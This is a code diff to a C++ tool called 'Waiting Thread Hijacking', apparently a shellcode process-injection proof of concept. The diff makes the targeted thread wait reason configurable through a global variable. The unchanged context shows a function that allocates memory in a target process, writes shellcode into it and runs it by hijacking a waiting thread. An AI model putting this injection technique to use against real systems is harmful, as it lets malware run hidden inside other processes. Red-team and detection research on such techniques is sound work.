@@ -5,19 +5,20 @@
 #include "common.h"
 #include "ntddk.h"
 
+DWORD g_WaitReason = WrQueue;
 
 inline bool execute_injection(DWORD processID)
 {
     LPVOID shellcodePtr = alloc_memory_in_process(processID);
     bool isOk = write_shc_into_process(processID, shellcodePtr);
     if (!isOk) return false;
-    return run_injected(processID, (ULONG_PTR)shellcodePtr, WrQueue);
+    return run_injected(processID, (ULONG_PTR)shellcodePtr, g_WaitReason);
 }
 
 int main(int argc, char* argv[])
 {
     if (argc < 2) {
-        std::cout << "Waiting Thread Hijacking. Target: WrQueue\n"
+        std::cout << "Waiting Thread Hijacking. Target Wait Reason: " << KWAIT_REASON_TO_STRING(g_WaitReason) << "\n"
             << "Arg <PID>" << std::endl;
         return 0;
     }
